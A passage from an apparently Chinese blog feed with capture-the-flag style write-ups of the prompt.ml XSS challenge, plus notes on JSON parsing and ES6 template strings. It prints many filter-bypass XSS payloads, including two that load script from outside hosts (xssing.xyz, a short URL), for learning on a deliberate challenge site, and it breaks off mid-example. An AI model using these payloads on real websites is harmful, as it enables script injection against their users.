<h3 id="Level-14-deprecated"><a href="#Level-14-deprecated" class="headerlink" title="Level-14-deprecated"></a>Level-14-deprecated</h3><p>原本思路是绕过img限制直接进行iframe的data协议xss, 但是uppercase已经无法绕过了..</p>
<h3 id="Level-15-HTML注释bypass-len限制"><a href="#Level-15-HTML注释bypass-len限制" class="headerlink" title="Level-15 HTML注释bypass/len限制"></a>Level-15 HTML注释bypass/len限制</h3><blockquote>
<p>input = input.replace(/*/g, ‘’);<br>var segments = input.split(‘#’);</p>
</blockquote>
<p>和Level-7类似, 不过被过滤了<code>*</code>,还有一个len15限制.<br>思路的话还是comment bypass, 依然是通过<code>svg</code>标签的扩展性导致javascript标签可以使用<code>html注释</code><br>vector:<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">"&gt;<span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="comment">&lt;!--#--&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="handlebars"><span class="xml"><span class="comment">&lt;!--#--&gt;</span>prompt(1)<span class="comment">&lt;!--#--&gt;</span></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<h4 id="example-1"><a href="#example-1" class="headerlink" title="example"></a>example</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span>     #可以尝试把svg去掉, 看看会不会弹框</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="handlebars"><span class="xml"></span><br><span class="line">	<span class="comment">&lt;!--</span><br><span class="line">	"aaa'</span><br><span class="line">	alert(1)</span><br><span class="line">	--&gt;</span></span><br><span class="line">	alert(/xss/);</span><br><span class="line"></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>嗯, 看了答案有几个不一样的.</p>
<h4 id="Firefox-amp-MSIE"><a href="#Firefox-amp-MSIE" class="headerlink" title="Firefox&amp;MSIE"></a>Firefox&amp;MSIE</h4><p>自动闭合所需标签, 少了几个字符<br>vector2:<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">"&gt;<span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="comment">&lt;!--#--&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="handlebars"><span class="xml"><span class="comment">&lt;!--#--&gt;</span>alert(1)<span class="tag">&lt;/</span></span></span></span><br></pre></td></tr></table></figure></p>
<p>第三个利用了ES6的模板解析<a href="/08/05/2016/js-template-strings/">这里</a><br>(也考虑到了`这个替代, 模板是没想到..)<br>vector3:<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">"&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="string">`#<span class="subst">$&#123;prompt(1)&#125;</span>#`</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>…hideen level没找到, 就不管了, 这些感觉够用了~</p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>Challenge:<br>  <a href="http://prompt.ml/0" target="_blank" rel="external">prompt</a><br>Writeup:<br>  <a href="https://github.com/cure53/XSSChallengeWiki/wiki/prompt.ml" target="_blank" rel="external">github-cure53</a></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[JSON使用注意]]></title>
      <url>http://csser.work/08/07/2016/js-json-parse/</url>
      <content type="html"><![CDATA[<h2 id="引"><a href="#引" class="headerlink" title="引"></a>引</h2><p>最近看xss看到关于json的代码, 就作一个json专项笔记吧.</p>
<h2 id="main"><a href="#main" class="headerlink" title="main()"></a>main()</h2><p>JSON.parse();</p>
<h3 id="引号问题"><a href="#引号问题" class="headerlink" title="引号问题"></a>引号问题</h3><p>注意一下单引号</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> code = <span class="string">'"\u0070\u0072\u006f\u006d\u0070\u0074\u0028\u0031\u0029"'</span>;</span><br><span class="line"><span class="comment">//  code必须由单引号扩起来</span></span><br><span class="line"><span class="built_in">JSON</span>.parse(code); <span class="comment">// "prompt(1)"</span></span><br><span class="line"><span class="built_in">eval</span>(code); <span class="comment">// prompt(1)</span></span><br></pre></td></tr></table></figure>
<h3 id="JSON对象"><a href="#JSON对象" class="headerlink" title="JSON对象"></a>JSON对象</h3><p>由上面引出来一个新的问题就是如果传入一个json对象, 那么对象应该是这么写:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> postData = &#123;</span><br><span class="line">  <span class="string">"name"</span> : <span class="number">1</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<p>而不是<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> postData = &#123;</span><br><span class="line">  <span class="string">'neme'</span> : <span class="number">1</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<h2 id="json对象和对象字面量"><a href="#json对象和对象字面量" class="headerlink" title="json对象和对象字面量~"></a>json对象和对象字面量~</h2><blockquote>
<p>Update in 08/11/2016</p>
<blockquote>
<p>汤姆大叔<br>JSON有非常严格的语法，在string上下文里<code>{ &quot;prop&quot;: &quot;val&quot; }</code>是个合法的JSON，但<code>{ prop: &quot;val&quot; }</code>和<code>{ &#39;prop&#39;: &#39;val&#39; }</code>确实不合法的</p>
</blockquote>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//  JS对象字面量</span></span><br><span class="line"><span class="keyword">var</span> jsObj = &#123;prop:<span class="string">"val"</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//  json对象</span></span><br><span class="line"><span class="keyword">var</span> jsonObj = &#123;<span class="string">"prop"</span>:<span class="string">"val"</span>&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h3><blockquote>
<p>复杂的数据结构经常需要用到，并且通过各种各样的中括号{}，小括号()，叫括号&lt;&gt;和空格来组成，这个字符串仅仅是按照要求规范好的字符。</p>
</blockquote>
<p>由于在js中所以一般使用的是json, 替代者有<code>YAML</code>和<code>XML</code>（甚至<code>request params</code>）</p>
<h3 id="字面量"><a href="#字面量" class="headerlink" title="字面量"></a>字面量</h3><blockquote>
<p>Mozilla Developer Center<br>1.他们是固定的值，不是变量，让你从“字面上”理解脚本。 (Literals)<br>2.字符串字面量是由双引号（”）或单引号（’）包围起来的零个或多个字符组成的。(Strings Literals)<br>3.对象字面量是由大括号（{}）括起来的零个或多个对象的属性名-值对。(Object Literals)</p>
</blockquote>
<h3 id="什么时候算是JSON"><a href="#什么时候算是JSON" class="headerlink" title="什么时候算是JSON?"></a>什么时候算是JSON?</h3><blockquote>
<p>形如<code>{ &quot;prop&quot;: &quot;val&quot; }</code>. 可能是JavaScript对象字面量也有可能是JSON字符串;<br>取决于什么上下文使用它;<br>如果是用在string上下文（<code>用单引号或双引号引住，或者从text文件读取</code>）的话，那它就是JSON字符串;<br>如果是用在对象字面量上下文中，那它就是对象字面量;</p>
</blockquote>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/JSON" target="_blank" rel="external">MDN-json</a><br><a href="http://www.cnblogs.com/TomXu/archive/2012/01/11/2311956.html" target="_blank" rel="external">深入理解js-汤姆大叔</a></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[ES6 模板字符串 & Xss利用]]></title>
      <url>http://csser.work/08/05/2016/js-template-strings/</url>
      <content type="html"><![CDATA[<h2 id="引子"><a href="#引子" class="headerlink" title="引子"></a>引子</h2><p>没事看了个xss, 借此学习一下这个template_strings</p>
<h2 id="Method"><a href="#Method" class="headerlink" title="Method"></a>Method</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">`strings`</span> <span class="comment">//  单行 和' " 用法一样</span></span><br><span class="line"><span class="string">`string1</span><br><span class="line"> string2`</span> <span class="comment">//  多行</span></span><br><span class="line"><span class="string">`string <span class="subst">$&#123;expression&#125;</span> string`</span> <span class="comment">// 可以直接引用变量, 像angualr一样</span></span><br></pre></td></tr></table></figure>
<h3 id="注意注释"><a href="#注意注释" class="headerlink" title="注意注释"></a>注意注释</h3><blockquote>
<pre><code>console.log(` test1        // there is no comments can stand!
     test2`);
</code></pre></blockquote>
<p>这句话看似有个单行注释, 实际上`会忽略注释的存在, 所以<code>注释无效</code></p>
<h3 id="表达式"><a href="#表达式" class="headerlink" title="表达式"></a>表达式</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="number">1</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;a&#125;</span>`</span>);</span><br><span class="line"><span class="comment">//  输出1</span></span><br></pre></td></tr></table></figure>
<h3 id="特殊的-num"><a href="#特殊的-num" class="headerlink" title="特殊的//num"></a>特殊的//num</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;1234&#125;</span>`</span>);</span><br><span class="line"><span class="comment">//  可以直接输出1234</span></span><br></pre></td></tr></table></figure>
<p>这个原因应该是 <code>数字开头</code>的不能作为js变量</p>
<h2 id="xssVector"><a href="#xssVector" class="headerlink" title="xssVector"></a>xssVector</h2><h3 id="1st"><a href="#1st" class="headerlink" title="1st"></a>1st</h3><p>最简单的<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">alert<span class="string">`1`</span></span><br><span class="line"><span class="comment">//  直接绕过() "" ''</span></span><br></pre></td></tr></table></figure></p>
<h3 id="2nd"><a href="#2nd" class="headerlink" title="2nd"></a>2nd</h3><p>第二个…<del>感觉是失败了</del><br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alert.call(<span class="keyword">this</span>, <span class="string">`<span class="subst">$&#123;1&#125;</span>`</span>)</span><br></pre></td></tr></table></figure></p>
<p>Update:<br><code>${CMD}</code>可以直接的命令执行~</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span><br><span class="line">  <span class="string">`<span class="subst">$&#123;alert(1)&#125;</span>`</span></span><br><span class="line"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="3rd"><a href="#3rd" class="headerlink" title="3rd"></a><strong>3rd</strong></h3><p>这个很棒, 绕过了() “” ‘’, 能使eval拥有<code>()</code>可以执行并且支持多种编码, 吊吊吊<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>.call<span class="string">`<span class="subst">$&#123;`alert\x281)`&#125;</span>`</span></span><br></pre></td></tr></table></figure></p>
<h2 id="最后一个"><a href="#最后一个" class="headerlink" title="最后一个"></a>最后一个</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">`<span class="subst">$&#123;`alert(1)`&#125;</span>`</span> === <span class="string">'alert(1)'</span> ? alert(<span class="literal">true</span>) : alert(<span class="literal">false</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">//true</span></span><br></pre></td></tr></table></figure>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/template_strings" target="_blank" rel="external">MDN</a></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[xss习题集_2.1]]></title>
      <url>http://csser.work/08/05/2016/xss-3/</url>
      <content type="html"><![CDATA[<h2 id="引"><a href="#引" class="headerlink" title="引"></a>引</h2><p>好久没搞这个了, 再练练几个姿势. 然后打算以后更新xss vector用gist, 养肥了再放blog了</p>
<p>这几天<del>今天</del>学的是这个练习站: <a href="http://prompt.ml/0" target="_blank" rel="external">Prompt(1) to win</a></p>
<h2 id="Challenges"><a href="#Challenges" class="headerlink" title="Challenges"></a>Challenges</h2><h3 id="Level-1-lt-gt-过滤"><a href="#Level-1-lt-gt-过滤" class="headerlink" title="Level-1 &lt;&gt; 过滤"></a>Level-1 &lt;&gt; 过滤</h3><blockquote>
<p>/&lt;\/?[^&gt;]+&gt;/gi</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=prompt(1) <span class="comment">#注意最后有个空格!!</span></span><br></pre></td></tr></table></figure>
<p>想了好久, 还是没法构造出<code>&lt;</code>, 最后看了小抄过的, 好蛋疼…<br>然而答案有点出乎意料, 想了一下也有道理, html会自动进行闭合, <code>svg</code>真心不错.<br>不过后面的空格还是不懂为什么存在与否会有这么大区别..</p>
<h3 id="Level-2-过滤"><a href="#Level-2-过滤" class="headerlink" title="Level-2 (= 过滤"></a>Level-2 (= 过滤</h3><blockquote>
<p>input = input.replace(/[=(]/g, ‘’);</p>
</blockquote>
<ol>
<li>ES6的新特性可以用 ` 来替换 ( <del>不过这题不行</del><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">prompt.call`<span class="keyword">this</span>, <span class="number">1</span>`</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>2.找了半天, 找到了vector<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">prompt&amp;#40;1&amp;#41;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>搞了之后才发现svg和script组合简直是无敌了, <code>HTML编码+script</code>(本例用了html10hex)</p>
<h3 id="Level-3-gt-替换"><a href="#Level-3-gt-替换" class="headerlink" title="Level-3 -&gt; 替换"></a>Level-3 -&gt; 替换</h3><blockquote>
<p>input.replace(/-&gt;/g, ‘_’);</p>
</blockquote>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span><br><span class="line">  --!&gt;&lt;svg/onload=prompt(1)</span><br><span class="line">--&gt;</span></span><br></pre></td></tr></table></figure>
<p>vector就是<code>--!&gt;</code>, 还好看了答案, 不然打死都想不到..  这个解析我服!</p>
<blockquote>
<p>原文<br>Although the character sequence <code>--!&gt;</code> raises a Parse error, the <a href="http://www.whatwg.org/specs/web-apps/current-work/multipage/syntax.html#comments" target="_blank" rel="external">HTML Specifications</a> defines the tokenization that makes it an alternative to end a comment:</p>
</blockquote>
<h3 id="Level-4-同源的正则过滤"><a href="#Level-4-同源的正则过滤" class="headerlink" title="Level-4 同源的正则过滤"></a>Level-4 同源的正则过滤</h3><blockquote>
<p>/^(?:https?:)?\/\/prompt.ml\//i.test(decodeURIComponent(input)<br>  <code>&quot;</code> ==&gt; <code>&amp;quot;</code><br>  <code>&lt;</code> ==&gt; <code>&amp;lt;</code><br>  <code>&gt;</code> ==&gt; <code>&amp;gt;</code><br>  <code>&amp;</code> ==&gt; <code>&amp;amp;</code></p>
</blockquote>
<p>看了半天writeup终于懂了, 绕的好棒!还有感觉自己总是死脑筋, 姿势不对啊….</p>
<p><strong>vector</strong>:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">"//prompt.ml%2f@xssing.xyz/test.js"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p>
<p>解释的话就需要引用一下wiki的<a href="https://en.wikipedia.org/wiki/Uniform_Resource_Identifier" target="_blank" rel="external">URLComponent</a>了<br><code>@</code>前面表示的其实是username和password, 但是对于没有作验证的服务器来说就是前面随便写, 这样的话就绕过了正则中所要求的<br><code>同域js调用</code>限制了, 其实感觉这个<code>decodeURIComponent</code>反而是给attcker一条捷径了..</p>
<p>因为在src中<code>/</code>不能被urldecode, 所以直接写的\/会被认为是路径, 自己也去试着去aliyun构造了一下域名, 不过失败告终</p>
<blockquote>
<p>aliyun<br>RR值中不能包含a–z、A–Z、0–9、’-‘ 、’.’、’*’、’中文汉字’以外的字符</p>
</blockquote>
<p><del>越来越好玩了哈哈</del></p>
<h3 id="Level-5-input-value限制"><a href="#Level-5-input-value限制" class="headerlink" title="Level-5 input_value限制"></a>Level-5 input_value限制</h3><blockquote>
<p>input.replace(/&gt;|on.+?=|focus/gi, ‘_’);</p>
</blockquote>
<p>vector_1:<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">" oninput</span><br><span class="line">=prompt(1) "</span><br></pre></td></tr></table></figure></p>
<p>这个感觉比前面几个简单一点, 虽然*focus没法用, 标签也没法闭合, 但是<code>正则中.不包括换行符\n</code>, 很尴尬<br>修改的话就加个这个就行了: <code>/\/&gt;|on(.|\n)+?=|focus/gi</code><br>oninput 支持IE9+ =, =</p>
<p>看了答案发现还有两个, 思路一致, 细节不一样, 学一手.<br>vector_2:<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">"type=image src onerror</span><br><span class="line">="prompt(1)</span><br></pre></td></tr></table></figure></p>
<p>这个vector以前看到过, 不过又忘记了..<br>input的type类型只取决于<code>最前面声明</code>的那个</p>
<p>vector_3:<br>oninput 改成 onresize(只在IE有效, 自己没ie..)</p>
<h3 id="Level-6-表单提交action过滤"><a href="#Level-6-表单提交action过滤" class="headerlink" title="Level-6 表单提交action过滤"></a>Level-6 表单提交action过滤</h3><blockquote>
<p>filter<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// let's do a post redirection</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// pass in formURL#formDataJSON</span></span><br><span class="line">        <span class="comment">// e.g. http://httpbin.org/post#&#123;"name":"Matt"&#125;</span></span><br><span class="line">        <span class="keyword">var</span> segments = input.split(<span class="string">'#'</span>);</span><br><span class="line">        <span class="keyword">var</span> formURL = segments[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">var</span> formData = <span class="built_in">JSON</span>.parse(segments[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> form = <span class="built_in">document</span>.createElement(<span class="string">'form'</span>);</span><br><span class="line">        form.action = formURL;</span><br><span class="line">        form.method = <span class="string">'post'</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i <span class="keyword">in</span> formData) &#123;</span><br><span class="line">            <span class="keyword">var</span> input = form.appendChild(<span class="built_in">document</span>.createElement(<span class="string">'input'</span>));</span><br><span class="line">            input.name = i;</span><br><span class="line">            input.setAttribute(<span class="string">'value'</span>, formData[i]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> form.outerHTML + <span class="string">'                         \n\</span><br><span class="line">&lt;script&gt;                                                  \n\</span><br><span class="line">    // forbid javascript: or vbscript: and data: stuff    \n\</span><br><span class="line">    if (!/script:|data:/i.test(document.forms[0].action)) \n\</span><br><span class="line">        document.forms[0].submit();                       \n\</span><br><span class="line">    else                                                  \n\</span><br><span class="line">        document.write("Action forbidden.")               \n\</span><br><span class="line">&lt;/script&gt;                                                 \n\</span><br><span class="line">        '</span>;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'Invalid form data.'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
</blockquote>
<p>vector:<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:prompt(1)#&#123;"action":1&#125;</span><br></pre></td></tr></table></figure></p>
<p>这个看了答案也迷糊了很久, 不过会了之后真的挺开心, 又学一个技能点: <code>js选取的DOM中的tag属性取用的是name的value</code>, 下面介绍一下</p>
<p>escape()这个函数先是创建了一个表单(含有input tag), 可控输出点在baseURL和input的<code>name</code>和value上<br>return一个script, 过滤了脚本协议(就是这个正则)</p>
<p>乍一看上去绕不过, 但是<code>document.forms[0].action</code>是有缺陷的</p>
<blockquote>
<p>由于存在子级tag, <strong>action</strong> 将会优先指向<code>name为action</code>的子tag.</p>
</blockquote>
<p>Wow!是不是很吊!</p>
<p>下面做个演示就知道了:</p>
<h4 id="example"><a href="#example" class="headerlink" title="example"></a>example</h4><p>创建一个html, 包含如下:<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"javascript:alert(1)"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"action"</span> <span class="attr">value</span>=<span class="string">"1"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">""</span> <span class="attr">name</span>=<span class="string">"actions"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>然后console中依次运行这些js:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.forms[<span class="number">0</span>].actions</span><br><span class="line"><span class="comment">//  &lt;input type name=​"actions"&gt;​</span></span><br><span class="line"><span class="built_in">document</span>.forms[<span class="number">0</span>].method</span><br><span class="line"><span class="comment">//  "post"</span></span><br><span class="line"><span class="built_in">document</span>.forms[<span class="number">0</span>].action</span><br><span class="line"><span class="comment">//  &lt;input name=​"action" value=​"1"&gt;​</span></span><br><span class="line"><span class="built_in">document</span>.forms[<span class="number">0</span>].action.name</span><br><span class="line"><span class="comment">//  "action"</span></span><br></pre></td></tr></table></figure></p>
<p>运行完就懂优先级了</p>
<h3 id="Level-7-连续输出长度限制"><a href="#Level-7-连续输出长度限制" class="headerlink" title="Level-7 连续输出长度限制"></a>Level-7 连续输出长度限制</h3><blockquote>
<p>filter<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> segments = input.split(<span class="string">'#'</span>);</span><br><span class="line"><span class="keyword">return</span> segments.map(<span class="function"><span class="keyword">function</span>(<span class="params">title</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// title can only contain 12 characters</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;p class="comment" title="'</span> + title.slice(<span class="number">0</span>, <span class="number">12</span>) + <span class="string">'"&gt;&lt;/p&gt;'</span>;</span><br><span class="line">&#125;).join(<span class="string">'\n'</span>);</span><br></pre></td></tr></table></figure></p>
</blockquote>
<p>vector:<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">"&gt;&lt;script&gt;/*#*/prompt(/*#*/1)/*#*/&lt;/script&gt;</span><br><span class="line">//"</span><br></pre></td></tr></table></figure></p>
<p>本来不想讲的, 后来发现自己好蠢..答案如下:</p>
<p>vector_2:</p>
<blockquote>
<p>“&gt;&lt;svg/a=#”onload=’/*#*/prompt(1)’</p>
</blockquote>
<p>虽然以前遇到过一次, 但是这个poc还是花了好久才搞好的..</p>
<blockquote>
<p>vector_3:<br>“&gt;&lt;script x=#”async=#”src=”//g.cn/xxx(短网址)</p>
</blockquote>
<h3 id="Level-8-script标签注释-闭合限制"><a href="#Level-8-script标签注释-闭合限制" class="headerlink" title="Level-8 script标签注释/闭合限制"></a>Level-8 script标签注释/闭合限制</h3><blockquote>
<p>input.replace(/[\r\n&lt;/“]/g, ‘’);<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">input = input.replace(<span class="regexp">/[\r\n&lt;/"]/g</span>, <span class="string">''</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="string">'                                \n\</span><br><span class="line">  &lt;script&gt;                                    \n\</span><br><span class="line">    // console.log("'</span> + input + <span class="string">'");        \n\</span><br><span class="line">  &lt;/script&gt; '</span>;</span><br></pre></td></tr></table></figure></p>
</blockquote>
<p>这个答案是<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[U+<span class="number">2028</span>]prompt(<span class="number">1</span>)[U+<span class="number">2028</span>]--&gt;</span><br></pre></td></tr></table></figure></p>
<p>不起作用, 但是又是学到很多:</p>
<blockquote>
<ol>
<li>Unicode 可以尝试绕过js中的特殊字符</li>
<li><code>HTMLComment</code>的妙用, 单行/多行都可以</li>
</ol>
</blockquote>
<h4 id="update"><a href="#update" class="headerlink" title="update"></a>update</h4><p>大牛在github回了我, got <a href="http://pastebin.com/GJ7U3hzh" target="_blank" rel="external">vector</a></p>
<p>LineBreak的链接也算找到了, 贴一下以后方便查:(一般28, 29),然后在线parse一下就行了</p>
<blockquote>
<p><a href="https://en.wikipedia.org/wiki/Newline" target="_blank" rel="external">WikiPedia-Newline</a><br>LF:    Line Feed, U+000A<br>VT:    Vertical Tab, U+000B<br>FF:    Form Feed, U+000C<br>CR:    Carriage Return, U+000D<br>CR+LF: CR (U+000D) followed by LF (U+000A)<br>NEL:   Next Line, U+0085<br>LS:    Line Separator, U+2028<br>PS:    Paragraph Separator, U+2029</p>
</blockquote>
<p>用法写在下面了, 运行就懂了, 不过<code>&lt;!--</code> 还是和 <code>--&gt;</code>有点区别的(看1, 4)</p>
<h4 id="example-1"><a href="#example-1" class="headerlink" title="example"></a>example</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="handlebars"><span class="xml"></span><br><span class="line">//	console.log("</span><br><span class="line">	alert(1)<span class="comment">&lt;!--");</span><br><span class="line">	alert(2)--&gt;</span>alert(3)</span><br><span class="line"></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span><br><span class="line">	//	console.log("</span><br><span 